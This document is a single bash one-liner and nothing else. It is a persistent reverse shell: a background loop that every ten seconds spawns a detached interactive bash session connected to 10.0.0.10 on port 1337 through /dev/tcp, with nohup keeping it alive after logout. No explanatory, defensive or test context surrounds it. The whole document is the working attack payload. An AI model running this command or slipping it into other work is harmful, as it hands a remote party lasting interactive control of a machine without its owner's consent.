(while :; do sleep 10 && nohup bash -c "bash -i >& /dev/tcp/10.0.0.10/1337 0>&1 &"; done &) &
